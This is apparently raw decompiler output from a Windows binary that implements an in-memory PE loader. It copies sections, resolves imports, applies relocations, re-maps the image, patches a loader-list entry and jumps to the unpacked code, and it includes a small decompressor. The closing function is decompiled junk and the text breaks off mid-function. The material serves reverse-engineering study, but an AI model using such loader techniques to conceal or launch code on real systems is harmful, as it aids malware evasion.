
struct s0 {
    signed char[6] pad6;
    uint16_t f6;
    signed char[4] pad12;
    void* fc;
    void* f10;
    void* f14;
    signed char[38] pad60;
    void* f3c;
    signed char[16] pad80;
    struct s0* f50;
    signed char[76] pad160;
    void* fa0;
    int32_t fa4;
};

int32_t g407044 = 0;

struct s0* g407034 = reinterpret_cast<struct s0*>(0);

int32_t VirtualAlloc = 0x1bda;

struct s0* g407024 = reinterpret_cast<struct s0*>(0);

void fun_401020(struct s0* a1, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, struct s0* a15, struct s0* a16, int32_t a17, struct s0* a18, struct s0* a19, struct s0* a20, struct s0* a21, struct s0* a22, struct s0* a23, struct s0* a24, struct s0* a25);

struct s1 {
    void* f0;
    void* f4;
    uint16_t f8;
};

int32_t fun_401860(struct s0* a1, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, int32_t a10) {
    int1_t zf11;
    struct s0* v12;
    struct s0* eax13;
    struct s0* v14;
    struct s0* v15;
    struct s0* eax16;
    int1_t zf17;
    struct s0* v18;
    struct s0* eax19;
    struct s0* esi20;
    struct s0* v21;
    struct s0* v22;
    struct s0* v23;
    struct s0* v24;
    struct s0* v25;
    struct s0* ebp26;
    struct s0* ecx27;
    void* v28;
    struct s1* v29;
    uint32_t v30;
    uint16_t* v31;
    uint32_t v32;
    struct s0* eax33;
    struct s0* esi34;
    void* tmp32_35;

    zf11 = g407044 == 0;
    if (zf11) {
        v12 = a2;
    } else {
        eax13 = g407034;
        v12 = eax13;
    }
    v14 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(v12) + reinterpret_cast<int32_t>(v12->f3c));
    v15 = v14->f50;
    eax16 = reinterpret_cast<struct s0*>(VirtualAlloc());
    g407024 = eax16;
    zf17 = g407024 == 0;
    if (!zf17) {
        v18 = v14->f50;
        eax19 = g407024;
        fun_401020(eax19, v12, v18, 0, v15, 0x3000, 64, esi20, v12, v21, v22, v14, v23, v24, v25, ebp26, __return_address(), a1, a2, a3, a4, a5, a6, a7, a8);
        ecx27 = g407024;
        v28 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(ecx27) - reinterpret_cast<uint32_t>(v12));
        if (v14->fa4) {
            v29 = reinterpret_cast<struct s1*>(reinterpret_cast<uint32_t>(v12) + reinterpret_cast<int32_t>(v14->fa0));
            while (v29->f4) {
                v30 = reinterpret_cast<uint32_t>(reinterpret_cast<int32_t>(v29->f4) - 8) >> 1;
                v31 = &v29->f8;
                v32 = 0;
                while (v32 < v30) {
                    if (reinterpret_cast<int32_t>(static_cast<uint32_t>(v31[v32])) >> 12 == 3) {
                        eax33 = g407024;
                        esi34 = g407024;
                        *reinterpret_cast<uint32_t*>(reinterpret_cast<uint32_t>(esi34) + reinterpret_cast<int32_t>(v29->f0) + (static_cast<uint32_t>(v31[v32]) & 0xfff)) = *reinterpret_cast<int32_t*>(reinterpret_cast<uint32_t>(eax33) + reinterpret_cast<int32_t>(v29->f0) + (static_cast<uint32_t>(v31[v32]) & 0xfff)) + reinterpret_cast<uint32_t>(v28);
                    }
                    ++v32;
                }
                v29 = reinterpret_cast<struct s1*>(reinterpret_cast<uint32_t>(v29) + reinterpret_cast<int32_t>(v29->f4));
            }
        }
        tmp32_35 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(a1) + reinterpret_cast<uint32_t>(g407024));
        goto tmp32_35;
    } else {
        return 2;
    }
}

struct s0* g40702c = reinterpret_cast<struct s0*>(0);

void fun_401020(struct s0* a1, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, struct s0* a15, struct s0* a16, int32_t a17, struct s0* a18, struct s0* a19, struct s0* a20, struct s0* a21, struct s0* a22, struct s0* a23, struct s0* a24, struct s0* a25) {
    struct s0* ecx26;
    signed char* tmp32_27;
    signed char* tmp32_28;
    struct s0* eax29;

    g40702c = reinterpret_cast<struct s0*>(0);
    while (ecx26 = g40702c, reinterpret_cast<uint32_t>(ecx26) < reinterpret_cast<uint32_t>(a3)) {
        tmp32_27 = reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(a1) + reinterpret_cast<uint32_t>(g40702c));
        tmp32_28 = reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(a2) + reinterpret_cast<uint32_t>(g40702c));
        *tmp32_27 = *tmp32_28;
        eax29 = g40702c;
        g40702c = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(eax29) + 1);
    }
    return;
}

int32_t GetProcAddress = 0x1bba;

void* fun_401270(struct s0* ecx, struct s0* a2, void* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, int32_t a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, struct s0* a15, struct s0* a16) {
    void* eax17;

    eax17 = reinterpret_cast<void*>(GetProcAddress(a2, a3, ecx));
    return eax17;
}

struct s5 {
    struct s5* f0;
    signed char[20] pad24;
    struct s0* f18;
    uint32_t f1c;
};

struct s4 {
    signed char[12] pad12;
    struct s5* fc;
};

struct s3 {
    signed char[12] pad12;
    struct s4* fc;
};

struct s2 {
    signed char[48] pad48;
    struct s3* f30;
};

struct s2* g407048 = reinterpret_cast<struct s2*>(0);

int32_t fun_4017c0(struct s0* a1, uint32_t a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, struct s0* a15, int32_t a16, struct s0* a17, struct s0* a18, struct s0* a19, struct s0* a20, struct s0* a21, struct s0* a22, struct s0* a23, struct s0* a24) {
    struct s2* ecx25;
    struct s4* v26;
    struct s5* v27;
    struct s5* v28;
    int32_t eax29;

    ecx25 = g407048;
    v26 = ecx25->f30->fc;
    v27 = v26->fc;
    v28 = v27;
    while (!0) {
        if (!v27) 
            goto addr_4017f5_4;
        if (v27->f18 == a1) 
            goto addr_401804_6;
        v27 = v27->f0;
        if (v27 == v28) 
            goto addr_401824_8;
    }
    eax29 = 0;
    addr_40182c_11:
    return eax29;
    addr_4017f5_4:
    eax29 = 0;
    goto addr_40182c_11;
    addr_401804_6:
    v27->f1c = a2;
    eax29 = 1;
    goto addr_40182c_11;
    addr_401824_8:
    eax29 = 0;
    goto addr_40182c_11;
}

struct s0* fun_401830(int32_t a1) {
    struct s0* eax2;

    eax2 = reinterpret_cast<struct s0*>(VirtualAlloc(0, a1, 0x3000, 4, 1));
    return eax2;
}

int32_t fun_401ae0(uint32_t* a1, unsigned char* a2);

void fun_4019e0(unsigned char* a1, struct s0* a2, uint32_t a3) {
    void* ebp4;
    uint32_t v5;
    unsigned char v6;
    void* v7;
    unsigned char v8;
    int32_t eax9;
    int32_t eax10;
    uint32_t v11;
    uint32_t v12;
    int32_t v13;

    ebp4 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    v5 = 1;
    v6 = *a1;
    v7 = reinterpret_cast<void*>(0);
    do {
        v8 = *reinterpret_cast<unsigned char*>(reinterpret_cast<int32_t>(a1) + v5);
        ++v5;
        if (static_cast<uint32_t>(v8) != static_cast<uint32_t>(v6)) {
            *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(a2) + reinterpret_cast<int32_t>(v7)) = v8;
            v7 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(v7) + 1);
        } else {
            if (*reinterpret_cast<unsigned char*>(reinterpret_cast<int32_t>(a1) + v5)) {
                eax9 = fun_401ae0(reinterpret_cast<int32_t>(ebp4) - 12, reinterpret_cast<int32_t>(a1) + v5);
                eax10 = fun_401ae0(reinterpret_cast<int32_t>(ebp4) - 28, reinterpret_cast<int32_t>(a1) + (eax9 + v5));
                v5 = eax10 + (eax9 + v5);
                v11 = 0;
                while (v11 < v12) {
                    *reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(a2) + reinterpret_cast<int32_t>(v7)) = *reinterpret_cast<signed char*>(reinterpret_cast<uint32_t>(a2) + (reinterpret_cast<int32_t>(v7) - v13));
                    v7 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(v7) + 1);
                    ++v11;
                }
            } else {
                *reinterpret_cast<unsigned char*>(reinterpret_cast<uint32_t>(a2) + reinterpret_cast<int32_t>(v7)) = v6;
                v7 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(v7) + 1);
                ++v5;
            }
        }
    } while (v5 < a3);
    return;
}

int32_t GetModuleHandleA = 0x1ba6;

struct s6 {
    signed char[40] pad40;
    uint32_t f28;
    signed char[8] pad52;
    struct s0* f34;
    signed char[24] pad80;
    struct s0* f50;
    signed char[44] pad128;
    void* f80;
    signed char[28] pad160;
    void* fa0;
    int32_t fa4;
};

struct s7 {
    void* f0;
    signed char[8] pad12;
    void* fc;
    void* f10;
};

int32_t LoadLibraryA = 0x1b96;

struct s8 {
    void* f0;
    void* f4;
    uint16_t f8;
};

int32_t CloseHandle = 0x1bcc;

void fun_4019b0(struct s0* a1, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, int32_t a15, struct s0* a16, struct s0* a17, struct s0* a18, struct s0* a19, struct s0* a20, struct s0* a21, struct s0* a22, struct s0* a23);

uint32_t g40704c = 0;

int32_t fun_401290(struct s0* a1) {
    struct s0* v2;
    struct s0* esi3;
    struct s0* v4;
    struct s0* v5;
    struct s0* v6;
    struct s0* v7;
    struct s0* eax8;
    struct s0* v9;
    struct s0* v10;
    struct s0* v11;
    struct s0* v12;
    struct s0* v13;
    struct s0* v14;
    struct s0* v15;
    int32_t v16;
    struct s0* v17;
    struct s0* v18;
    struct s0* v19;
    struct s0* v20;
    struct s0* v21;
    struct s0* v22;
    struct s0* v23;
    struct s0* eax24;
    struct s0* v25;
    struct s0* eax26;
    struct s0* v27;
    struct s0* eax28;
    struct s0* v29;
    int32_t eax30;
    int32_t v31;
    uint32_t v32;
    struct s0* v33;
    struct s0* v34;
    struct s0* v35;
    struct s0* v36;
    int32_t v37;
    struct s0* v38;
    struct s0* v39;
    struct s0* v40;
    struct s0* v41;
    struct s0* v42;
    struct s6* v43;
    struct s0* v44;
    struct s0* eax45;
    struct s0* v46;
    int32_t eax47;
    struct s7* v48;
    struct s0* v49;
    struct s0* eax50;
    struct s0* v51;
    void** v52;
    void** v53;
    int32_t v54;
    void* v55;
    void* eax56;
    void* v57;
    void* eax58;
    int1_t zf59;
    struct s0* edx60;
    void* v61;
    struct s8* v62;
    uint32_t v63;
    uint16_t* v64;
    uint32_t v65;
    struct s0* eax66;
    int32_t eax67;
    int1_t zf68;
    struct s0* v69;
    struct s0* v70;
    struct s0* eax71;
    struct s0* edx72;
    struct s0* eax73;
    int1_t zf74;
    struct s0* v75;
    struct s0* edx76;
    int1_t zf77;
    struct s0* eax78;
    struct s0* ecx79;
    uint32_t v80;
    struct s0* edx81;
    int1_t zf82;
    struct s0* v83;
    int32_t eax84;
    struct s0* v85;
    int32_t v86;
    int32_t eax87;
    int1_t zf88;
    struct s0* v89;
    struct s0* v90;
    struct s0* eax91;
    struct s0* ecx92;
    struct s0* eax93;
    struct s0* ecx94;
    int32_t eax95;
    struct s0* edx96;
    int32_t v97;
    int32_t eax98;
    struct s0* edx99;
    uint32_t ecx100;
    int1_t zf101;
    int1_t zf102;
    struct s0* v103;
    struct s0* eax104;
    struct s0* eax105;
    struct s0* v106;
    struct s0* v107;
    struct s0* eax108;

    v2 = esi3;
    v4 = a1;
    v5 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(a1) + reinterpret_cast<int32_t>(v4->f3c));
    v6 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(v5) + reinterpret_cast<uint16_t>(v5->f14) + 24);
    v7 = v5->f50;
    eax8 = reinterpret_cast<struct s0*>(VirtualAlloc());
    v9 = eax8;
    if (v9) {
        v10 = reinterpret_cast<struct s0*>(reinterpret_cast<int32_t>(v4->f3c) + v5->f6 * 40 + 0x138);
        fun_401020(v9, a1, v10, 0, v7, 0x3000, 64, v2, v11, v4, v12, v13, v5, v14, v15, v9, v16, v6, v17, v18, v19, v20, v21, v22, v23);
        eax24 = reinterpret_cast<struct s0*>(GetModuleHandleA("kernel32.dll", "UnmapViewOfFile"));
        v25 = eax24;
        eax26 = reinterpret_cast<struct s0*>(GetProcAddress(v25, "kernel32.dll", "UnmapViewOfFile"));
        v27 = eax26;
        eax28 = reinterpret_cast<struct s0*>(GetModuleHandleA("kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
        v29 = eax28;
        eax30 = reinterpret_cast<int32_t>(GetProcAddress(v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
        v31 = eax30;
        v32 = 0;
        while (v32 < static_cast<uint32_t>(v5->f6)) {
            if (v6->f14 && v6->f10) {
                v33 = reinterpret_cast<struct s0*>((reinterpret_cast<int32_t>(v6->f10) + reinterpret_cast<int32_t>(v5->f3c) - 1) / reinterpret_cast<uint32_t>(v5->f3c) * reinterpret_cast<int32_t>(v5->f3c));
                v34 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(a1) + reinterpret_cast<uint16_t>(v6->f14));
                v35 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v6->fc));
                fun_401020(v35, v34, v33, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile", 0, v7, 0x3000, 64, v2, v36, v4, v37, v38, v5, v27, v39, v9, v40, v6, v41);
            }
            v6 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(v6) + 40);
            ++v32;
        }
        v42 = v9;
        v43 = reinterpret_cast<struct s6*>(reinterpret_cast<uint32_t>(v42) + reinterpret_cast<int32_t>(v42->f3c));
        v44 = v43->f50;
        eax45 = reinterpret_cast<struct s0*>(v31(0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
        v46 = eax45;
        if (!v46) 
            goto addr_4013e2_9;
    } else {
        eax47 = 0;
        goto addr_4017b2_11;
    }
    v48 = reinterpret_cast<struct s7*>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v43->f80));
    while (v48->f10) {
        v49 = reinterpret_cast<struct s0*>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v48->fc));
        eax50 = reinterpret_cast<struct s0*>(LoadLibraryA(v49, 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
        v51 = eax50;
        if (!v48->f0) {
            v52 = reinterpret_cast<void**>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v48->f10));
            v53 = reinterpret_cast<void**>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v48->f0));
        } else {
            v52 = reinterpret_cast<void**>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v48->f0));
            v53 = reinterpret_cast<void**>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v48->f10));
        }
        v54 = 0;
        if (v48->f10 && v48->f0) {
            v54 = 1;
        }
        while (*v52) {
            if (!(reinterpret_cast<uint32_t>(*v52) & 0x80000000)) {
                v55 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(*v52) + reinterpret_cast<uint32_t>(v9) + 2);
                eax56 = fun_401270(v51, v51, v55, v49, 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile");
                *v52 = eax56;
            } else {
                v57 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(*v52) & 0x7fffffff);
                eax58 = fun_401270(v51, v51, v57, v49, 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile");
                *v52 = eax58;
            }
            if (!*v52) 
                goto addr_4014c8_24;
            if (v54) {
                *v53 = *v52;
            }
            ++v52;
            ++v53;
        }
        ++v48;
    }
    zf59 = g407044 == 0;
    if (!zf59 && (edx60 = g407034, v61 = reinterpret_cast<void*>(reinterpret_cast<uint32_t>(edx60) - reinterpret_cast<uint32_t>(v43->f34)), !!v43->fa4)) {
        v62 = reinterpret_cast<struct s8*>(reinterpret_cast<uint32_t>(v42) + reinterpret_cast<int32_t>(v43->fa0));
        while (v62->f4) {
            v63 = reinterpret_cast<uint32_t>(reinterpret_cast<int32_t>(v62->f4) - 8) >> 1;
            v64 = &v62->f8;
            v65 = 0;
            while (v65 < v63) {
                if (reinterpret_cast<int32_t>(static_cast<uint32_t>(v64[v65])) >> 12 == 3) {
                    *reinterpret_cast<uint32_t*>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v62->f0) + (static_cast<uint32_t>(v64[v65]) & 0xfff)) = *reinterpret_cast<int32_t*>(reinterpret_cast<uint32_t>(v9) + reinterpret_cast<int32_t>(v62->f0) + (static_cast<uint32_t>(v64[v65]) & 0xfff)) + reinterpret_cast<uint32_t>(v61);
                }
                ++v65;
            }
            v62 = reinterpret_cast<struct s8*>(reinterpret_cast<uint32_t>(v62) + reinterpret_cast<int32_t>(v62->f4));
        }
    }
    eax66 = reinterpret_cast<struct s0*>(GetModuleHandleA("kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
    eax67 = reinterpret_cast<int32_t>(GetProcAddress(eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
    zf68 = g407044 == 0;
    if (zf68) {
        v69 = v43->f34;
        v70 = v46;
        eax71 = reinterpret_cast<struct s0*>(eax67(v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
        g407024 = eax71;
    } else {
        edx72 = g407034;
        v69 = edx72;
        v70 = v46;
        eax73 = reinterpret_cast<struct s0*>(eax67(v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
        g407024 = eax73;
    }
    zf74 = g407024 == 0;
    if (!zf74) {
        addr_401736_43:
        CloseHandle(v46, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile");
        v75 = v43->f50;
        edx76 = g407024;
        fun_401020(edx76, v9, v75, v46, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile");
        zf77 = g407044 == 0;
        if (zf77) {
            eax78 = g407024;
            fun_4019b0(eax78, v46, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile");
        } else {
            ecx79 = g407024;
            v80 = reinterpret_cast<uint32_t>(ecx79) + v43->f28;
            edx81 = g407034;
            fun_4017c0(edx81, v80, v46, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile");
        }
    } else {
        zf82 = g407044 == 0;
        if (zf82) {
            v83 = v43->f34;
            eax84 = reinterpret_cast<int32_t>(v27(v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
            if (eax84 || (v85 = v43->f34, eax87 = reinterpret_cast<int32_t>(v86(v85, 0, 0x8000, v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile")), !!eax87)) {
                addr_4016a2_48:
                zf88 = g407044 == 0;
                if (zf88) {
                    v89 = v43->f34;
                    v90 = v46;
                    eax91 = reinterpret_cast<struct s0*>(eax67(v90, 34, 0, 0, 0, v89, v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
                    g407024 = eax91;
                    goto addr_4016e3_50;
                } else {
                    ecx92 = g407034;
                    v89 = ecx92;
                    v90 = v46;
                    eax93 = reinterpret_cast<struct s0*>(eax67(v90, 34, 0, 0, 0, v89, v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
                    g407024 = eax93;
                    goto addr_4016e3_50;
                }
            } else {
                eax47 = 0;
                goto addr_4017b2_11;
            }
        } else {
            ecx94 = g407034;
            v83 = ecx94;
            eax95 = reinterpret_cast<int32_t>(v27(v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
            if (eax95 || (edx96 = g407034, eax98 = reinterpret_cast<int32_t>(v97(edx96, 0, 0x8000, v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile")), !!eax98)) {
                goto addr_4016a2_48;
            } else {
                eax47 = 0;
                goto addr_4017b2_11;
            }
        }
    }
    edx99 = g407024;
    g40704c = reinterpret_cast<uint32_t>(edx99) + v43->f28;
    ecx100 = g40704c;
    v43->f28 = ecx100;
    eax47 = 1;
    addr_4017b2_11:
    return eax47;
    addr_4016e3_50:
    zf101 = g407024 == 0;
    if (zf101) {
        zf102 = g407044 == 0;
        if (!zf102) {
            v103 = v43->f50;
            eax104 = g407034;
            eax105 = reinterpret_cast<struct s0*>(VirtualAlloc(eax104, v103, 0x3000, 64, v90, 34, 0, 0, 0, v89, v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
            g407024 = eax105;
            goto addr_401736_43;
        } else {
            v106 = v43->f50;
            v107 = v43->f34;
            eax108 = reinterpret_cast<struct s0*>(VirtualAlloc(v107, v106, 0x3000, 64, v90, 34, 0, 0, 0, v89, v83, v70, 34, 0, 0, 0, v69, eax66, "kernel32.dll", "MapViewOfFileEx", 0xff, 0, 4, 0, v44, 0, v29, "kernel32.dll", "CreateFileMappingA", v25, "kernel32.dll", "UnmapViewOfFile"));
            g407024 = eax108;
            goto addr_401736_43;
        }
    }
    addr_4014c8_24:
    eax47 = 0;
    goto addr_4017b2_11;
    addr_4013e2_9:
    eax47 = 0;
    goto addr_4017b2_11;
}

struct s9 {
    signed char[8] pad8;
    struct s0* f8;
};

void fun_4019b0(struct s0* a1, struct s0* a2, struct s0* a3, struct s0* a4, struct s0* a5, struct s0* a6, struct s0* a7, struct s0* a8, struct s0* a9, struct s0* a10, struct s0* a11, struct s0* a12, struct s0* a13, struct s0* a14, int32_t a15, struct s0* a16, struct s0* a17, struct s0* a18, struct s0* a19, struct s0* a20, struct s0* a21, struct s0* a22, struct s0* a23) {
    struct s2* edx24;

    edx24 = g407048;
    (*reinterpret_cast<struct s9**>(reinterpret_cast<int32_t>(edx24) + 0x335 - 0x305))->f8 = a1;
    return;
}

int32_t fun_401ae0(uint32_t* a1, unsigned char* a2) {
    uint32_t v3;
    int32_t v4;
    uint32_t v5;

    v3 = 0;
    v4 = 0;
    do {
        v5 = *a2;
        ++a2;
        v3 = v5 & 0x7f | v3 << 7;
        ++v4;
    } while (v5 & 0x80);
    *a1 = v3;
    return v4;
}

void fun_401018() {
    signed char* eax1;
    signed char* eax2;
    signed char al3;
    signed char* eax4;
    signed char* eax5;
    signed char al6;
    signed char* eax7;
    signed char* eax8;
    signed char al9;
    signed char* eax10;
    signed char* eax11;
    signed char al12;

    *eax1 = reinterpret_cast<signed char>(*eax2 + al3);
    *eax4 = reinterpret_cast<signed char>(*eax5 + al6);
    *eax7 = reinterpret_cast<signed char>(*eax8 + al9);
    *eax10 = reinterpret_cast<signed char>(*eax11 + al12);
}

struct s10 {
    unsigned char f0;
    signed char[113] pad114;
    int32_t f72;
};

struct s11 {
    signed char[101] pad101;
    uint32_t f65;
};

struct s12 {
    signed char[101] pad101;
    int32_t f65;
};

struct s13 {
    signed char[101] pad101;
    int32_t f65;
};

struct s14 {
    signed char[69] pad69;
    signed char f45;
    signed char[38] pad108;
    unsigned char f6c;
};

void fun_401b40(unsigned char* ecx) {
    void* esp2;
    signed char* eax3;
    signed char* eax4;
    signed char al5;
    signed char* eax6;
    signed char* eax7;
    signed char al8;
    signed char* eax9;
    signed char* eax10;
    signed char al11;
    unsigned char tmp8_12;
    signed char dl13;
    int32_t edx14;
    unsigned char* eax15;
    void* eax16;
    int32_t* eax17;
    uint32_t eax18;
    int32_t* eax19;
    unsigned char dl20;
    unsigned char tmp8_21;
    uint1_t cf22;
    unsigned char tmp8_23;
    int32_t esi24;
    uint1_t cf25;
    int32_t esi26;
    int32_t esi27;
    int32_t* eax28;
    unsigned char tmp8_29;
    signed char bh30;
    uint1_t cf31;
    int32_t* eax32;
    unsigned char tmp8_33;
    signed char bl34;
    struct s10* edx35;
    unsigned char* eax36;
    int32_t ebx37;
    int32_t ebx38;
    int32_t ebx39;
    int32_t ebx40;
    struct s11* edi41;
    struct s12* edi42;
    struct s13* edi43;
    int1_t zf44;
    int32_t edi45;
    struct s14* ebx46;
    void* ebx47;
    unsigned char tmp8_48;
    int1_t cf49;

    esp2 = reinterpret_cast<void*>(reinterpret_cast<int32_t>(__zero_stack_offset()) - 4);
    *eax3 = reinterpret_cast<signed char>(*eax4 + al5);
    *eax6 = reinterpret_cast<signed char>(*eax7 + al8);
    *eax9 = reinterpret_cast<signed char>(*eax10 + al11);
    tmp8_12 = reinterpret_cast<unsigned char>(dl13 + *reinterpret_cast<signed char*>(reinterpret_cast<int32_t>(&ecx) + 1));
    *reinterpret_cast<unsigned char*>(&edx14) = tmp8_12;
    eax15 = reinterpret_cast<unsigned char*>(reinterpret_cast<int32_t>(eax16) - (*eax17 + reinterpret_cast<uint1_t>(eax18 < *eax19 + reinterpret_cast<uint1_t>(tmp8_12 < dl20))));
    tmp8_21 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    cf22 = reinterpret_cast<uint1_t>(tmp8_21 < *eax15);
    *eax15 = tmp8_21;
    *eax15 = reinterpret_cast<unsigned char>(reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15)) + cf22);
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    *eax15 = reinterpret_cast<unsigned char>(*eax15 + *reinterpret_cast<signed char*>(&eax15));
    tmp8_23 = reinterpret_cast<unsigned char>(*reinterpret_cast<signed char*>(esi24 - 0x59ffffe5) + *reinterpret_cast<unsigned char*>(&edx14));
    cf25 = reinterpret_cast<uint1_t>(tmp8_23 < *reinterpret_cast<unsigned char*>(esi26 - 0x59ffffe5));
    *reinterpret_cast<unsigned char*>(esi27 - 0x59ffffe5) = tmp8_23;
    eax28 = reinterpret_cast<int32_t*>(reinterpret_cast<uint32_t>(eax15) - (*eax15 + reinterpret_cast<uint1_t>(reinterpret_cast<uint32_t>(eax15) < *eax15 + cf25)));
